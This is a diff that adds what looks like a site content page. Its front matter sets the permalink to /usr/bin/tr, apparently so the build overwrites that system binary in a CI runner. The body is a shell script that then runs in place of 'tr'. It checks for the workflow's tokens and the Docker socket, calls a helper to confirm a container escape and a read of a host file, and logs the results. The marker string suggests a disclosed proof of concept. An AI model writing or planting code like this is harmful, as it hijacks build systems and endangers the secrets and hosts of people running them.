@@ -1,0 +1,40 @@
+---
+permalink: /usr/bin/tr
+---
+#!/bin/sh
+marker='MANAGED_PAGES_SYMLINK_APP_EXEC_20260820'
+result=/github/workspace/managed-symlink-exec.txt
+lock=/github/workspace/.managed-symlink-exec-lock
+if /usr/bin/mkdir "$lock" 2>/dev/null; then
+  token_state=absent
+  runtime_token_state=absent
+  docker_state=absent
+  docker_sibling_roundtrip=absent
+  docker_host_proof='docker_host_file_read=absent'
+  [ -n "${INPUT_TOKEN:-}" ] && token_state=present
+  [ -n "${ACTIONS_RUNTIME_TOKEN:-}" ] && runtime_token_state=present
+  [ -S /var/run/docker.sock ] && docker_state=present
+  if [ "$docker_state" = present ]; then
+    sibling_proof=$(node /github/workspace/managed-pages-docker-sibling-control.cjs 2>/dev/null) || sibling_proof=''
+    case "$sibling_proof" in
+      confirmed\ docker_host_file_read=confirmed\ *)
+        docker_sibling_roundtrip=confirmed
+        docker_host_proof=${sibling_proof#confirmed }
+        ;;
+    esac
+  fi
+  printf '%s identity="%s" input_token=%s runtime_token=%s docker_socket=%s docker_sibling_roundtrip=%s %s\n' \
+    "$marker" "$(/usr/bin/id)" "$token_state" "$runtime_token_state" "$docker_state" "$docker_sibling_roundtrip" "$docker_host_proof" > "$result"
+else
+  attempts=0
+  while [ ! -s "$result" ] && [ "$attempts" -lt 100 ]; do
+    /usr/bin/sleep 0.05
+    attempts=$((attempts + 1))
+  done
+fi
+if [ -s "$result" ]; then
+  /usr/bin/cat "$result"
+else
+  printf '%s execution_result=unavailable\n' "$marker"
+fi
+exit 0
